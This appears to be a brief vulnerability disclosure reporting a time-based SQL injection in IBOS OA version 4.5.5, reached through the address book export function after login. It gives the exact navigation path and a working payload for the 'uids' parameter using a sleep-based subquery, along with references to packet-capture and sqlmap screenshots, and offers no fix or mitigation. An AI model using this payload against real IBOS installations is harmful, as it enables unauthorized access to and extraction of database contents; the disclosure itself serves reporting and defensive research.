SQL injection vulnerability in ibos oa v4.5.5

official website： http://www.ibos.com.cn/

version：4.5.5

Log in to the background. Personal Office => Address Book => Export This Page => Packet Capture Delay Injection Succeeded

![微信截图_20230918104519](https://github.com/xiaosed/cve/assets/84080097/d01609e7-4acf-4c40-8852-a316500d6e25)



![图片3](https://github.com/xiaosed/cve/assets/84080097/5c9c7320-a602-4deb-8186-65eb130e9118)




Payload：uids=u_1'and(select*from(select+sleep(8))a/**/union/**/select+1)='

Sqlmap：

![图片4](https://github.com/xiaosed/cve/assets/84080097/dddb023a-22d1-4b79-80b9-87177facc95a)

